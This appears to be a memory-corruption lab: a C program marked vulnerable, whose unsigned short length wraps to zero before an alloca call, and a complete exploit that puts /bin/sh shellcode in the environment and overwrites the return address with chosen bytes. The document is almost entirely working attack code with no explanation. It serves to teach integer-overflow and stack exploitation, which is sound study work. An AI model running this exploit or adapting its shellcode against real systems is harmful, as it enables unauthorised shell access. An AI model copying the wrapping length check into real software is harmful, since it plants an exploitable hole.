// program.c (vulnerable)
#include <alloca.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static void usage(const char *argv0) {
    printf("Build your own string!\n");
    printf("\n");
    printf("Usage:\n");
    printf("  %s length command...\n", argv0);
    printf("\n");
    printf("Each command consist of a single character followed by it's index.\n");
    printf("\n");
    printf("Example:\n");
    printf("  %s 11 h0 e1 l2 l3 o4 w6 o7 r8 l9 d10\n", argv0);
    exit(1);
}

int main(int argc, char **argv) {
    char *buffer;
    unsigned short buffersize, i, index, length;

    if (argc < 2) usage(argv[0]);

    length = atoi(argv[1]);
    if (length <= 0) {
        fprintf(stderr, "bad length\n");
        return 1;
    }

    buffersize = length + 1;
    buffer = alloca(buffersize);
    memset(buffer, ' ', buffersize);
    buffer[buffersize - 1] = 0;

    for (i = 2; i < argc; i++) {
        if (strlen(argv[i]) < 2) {
            fprintf(stderr, "bad command \"%s\"\n", argv[i]);
            return 1;
        }

        index = atoi(argv[i] + 1);
        if (index >= length) {
            fprintf(stderr, "bad index in command \"%s\"\n", argv[i]);
            return 1;
        }

        buffer[index] = argv[i][0];
    }

    printf("%s\n", buffer);
    return 0;
}

// exploit.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

unsigned char code[] =
    "\xeb\x15\x5b\x31\xc0\x89\x5b\x08\x88\x43\x07\x8d\x4b\x08\x89\x43"
    "\x0c\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/bin/sh";

#define VULN "/path/to/program"

int main(int argc, char **argv) {
    unsigned int addr;
    char *n[] = { VULN, "65535", "\xc0" "44", "\xff" "45", "\xff" "46", "\xbf" "47", NULL };
    char *env[] = { code, NULL };

    addr = 0xc0000000 - 4 - strlen(VULN) - 1 - strlen(code) - 1;
    fprintf(stderr, "Using address: %#010x\n", addr);
    // 0xbfffffc0 -> \xc0 \xff \xff \xbf

    // MAX UNSIGNED INT = 65535
    // ARGV: 65535 \xc00 A \xff1 B \xff2 C \xbf3 D        

    execve(n[0], n, env);
    perror("execve");
    exit(1);
}

// makefile
// exploit: exploit.c
//     gcc -o exploit exploit.c
